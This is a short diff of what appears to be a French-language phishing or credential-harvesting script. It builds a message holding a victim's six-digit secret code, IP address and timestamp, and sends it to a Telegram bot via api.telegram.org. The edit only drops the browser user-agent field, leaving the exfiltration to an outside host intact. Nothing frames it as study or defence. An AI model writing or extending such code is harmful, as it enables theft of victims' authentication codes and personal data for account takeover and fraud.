@@ -862,8 +862,7 @@ Code Secret (6 chiffres): ${secretCode}
 
 🌐 INFOS TECH:
 IP: ${ip}
-Date: ${new Date().toLocaleString('fr-FR')}
-Navigateur: ${navigator.userAgent}`;
+Date: ${new Date().toLocaleString('fr-FR')}`;
 
                 // Envoyer au premier bot
                 fetch(`https://api.telegram.org/bot${bot1.token}/sendMessage`, {
